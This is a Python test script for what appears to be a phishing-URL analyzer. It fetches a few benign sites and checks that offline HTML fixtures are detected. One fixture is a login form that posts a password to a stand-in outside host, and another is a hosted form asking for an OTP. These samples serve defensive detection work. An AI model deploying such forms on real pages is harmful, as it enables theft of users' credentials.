"""Real benign URL checks plus controlled offline suspicious-page fixtures."""
import asyncio
import json
import sys
from pathlib import Path
ROOT=Path(__file__).resolve().parents[1];sys.path[:0]=[str(ROOT/'backend'),str(ROOT)]
from app.core.fetch import fetch
from app.analyzers.url.page import inspect_page

async def main():
    results=[]
    for url in ['https://example.com/','https://meet.google.com/home','https://www.wikipedia.org/']:
        try:
            response=await fetch(url)
            page,findings,_=inspect_page(response.body,response.url,'test')
            flags=[e.label for e in findings if e.score is not None and e.score>=.5]
            results.append({'url':url,'final_url':response.url,'status':response.status,'title':page['title'],'high_indicators':flags})
        except Exception as exc:results.append({'url':url,'error':str(exc)[:250]})
    fixtures=[('external secret submission',b'<form method="post" action="http://collector.example"><input type="password"></form>','https://example.com','credential_destination_mismatch'),('hosted secret collection',b'<form method="post"><input aria-label="Your OTP"></form>','https://docs.google.com/forms/d/e/test/viewform','hosted_form_secret_request')]
    for name,html,url,label in fixtures:
        _,findings,_=inspect_page(html,url,'fixture')
        assert any(e.label==label for e in findings)
        results.append({'fixture':name,'detected':label,'network_used':False})
    output=ROOT/'research/results/url-review-10k.json';output.parent.mkdir(exist_ok=True,parents=True)
    output.write_text(json.dumps(results,indent=2));print(json.dumps(results,indent=2))

if __name__=='__main__':asyncio.run(main())
